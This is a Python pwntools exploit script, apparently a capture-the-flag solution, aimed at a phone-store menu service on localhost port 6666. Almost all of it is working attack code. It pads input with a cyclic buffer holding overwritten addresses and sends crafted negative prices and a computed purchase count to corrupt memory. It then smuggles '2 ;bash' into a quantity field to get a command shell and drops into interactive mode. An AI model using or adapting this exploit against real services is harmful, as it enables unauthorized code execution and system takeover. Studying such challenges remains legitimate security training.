from pwn import *
 
saved = [cyclic(100000)]
def eat(n):
    res, saved[0] = saved[0][:n], saved[0][n:]
    return res
saved = [eat(204) + p32(0x0804B00B) + eat(1610) + p32(0x08049B74) + eat(100)]
 
# r = process('./wrapper.sh')
r = remote('localhost', 6666)
 
# Go to modify menu
r.sendlineafter('Your choice? ', 'a')
r.sendlineafter("What's the name of your store? ",  eat(63))
#raw_input() 
# Add a phone
r.sendlineafter('Your choice? ', 'a')
r.sendlineafter("Phone's name? ", eat(31))
r.sendlineafter("Choose Phone's OS? ", "4")
r.sendlineafter("Phone's price? ", "-2139623424")
r.sendlineafter("Phone's description? ", eat(79))
 
# Malloc the store string
r.sendlineafter('Your choice? ', 'c')
 
# Add more phones
for _ in range(15):
    print _
    r.sendlineafter('Your choice? ', 'a')
    r.sendlineafter("Phone's name? ", eat(31))
    r.sendlineafter("Choose Phone's OS? ", "4")
    r.sendlineafter("Phone's price? ", "-4294905888")
    r.sendlineafter("Phone's description? ", eat(79))
 
print 100000 - len(saved[0])
 
# Malloc the store string
r.sendlineafter('Your choice? ', 'c')
 
# gdb.attach(r, '''
# b *0x08048F6B
# c
# ''')
 
# Return to main manu
r.sendlineafter('Your choice? ', 'd')
raw_input() 
# Try store
r.sendlineafter('Your choice? ', 'b')
 
# Use the overflowed item
r.sendlineafter('What do you want to buy? ', '2')
 
# wholesale 10
r.sendlineafter('Your choice? ', 'b')
r.sendlineafter('How many do you plan to buy? ', str(0x0804B280 - len("Blackberry OS Phone a price: -2147483648 CNY description: ")) + ' AAAA')
 
# Return
r.sendlineafter('Your choice? ', 'c')
 
# Go in again
r.sendlineafter('Your choice? ', 'b')
 
# Buy 2!
r.sendlineafter('What do you want to buy? ', '1')
r.sendlineafter('Your choice? ', 'a')
r.sendlineafter('Hey rich man! How many do you want to buy? ', '2 ;bash')
 
r.interactive()
# # pause()
 
# r.interactive()
